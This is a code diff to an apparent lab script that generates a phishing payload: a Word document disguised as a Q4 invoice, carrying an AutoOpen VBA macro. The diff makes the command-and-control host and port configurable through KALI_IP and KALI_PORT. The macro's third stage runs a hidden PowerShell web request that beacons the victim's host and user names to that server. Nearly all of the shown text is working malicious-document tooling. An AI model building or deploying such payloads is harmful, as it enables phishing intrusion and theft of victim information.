@@ -9,10 +9,12 @@ Output: payloads/invoice_Q4_2024.docx  +  payloads/macro_code.vba
 
 import os
 
-OUT = os.path.join(os.path.dirname(__file__), "..", "payloads")
+OUT    = os.path.join(os.path.dirname(__file__), "..", "payloads")
+C2_IP  = os.getenv("KALI_IP") or __import__("socket").gethostbyname(__import__("socket").gethostname())
+C2_PORT = os.getenv("KALI_PORT", "8080")
 os.makedirs(OUT, exist_ok=True)
 
-VBA = """\
+VBA = f"""\
 ' ============================================================
 ' LAB DEMO MACRO  —  invoice_Q4_2024.docm
 ' AutoOpen fires the moment the victim enables macros.
@@ -42,7 +44,7 @@ Sub DropPayload()
     ' Stage 3 – beacon back to C2
     Dim ps As String
     ps = "powershell -nop -w hidden -c " & _
-         """Invoke-WebRequest -Uri 'http://192.168.11.149:8080/beacon" & _
+         """Invoke-WebRequest -Uri 'http://{C2_IP}:{C2_PORT}/beacon" & _
          "?macro=1&host=" & host & "&user=" & user & "' -UseBasicParsing"""
     Shell "cmd.exe /c " & ps, vbHide
 
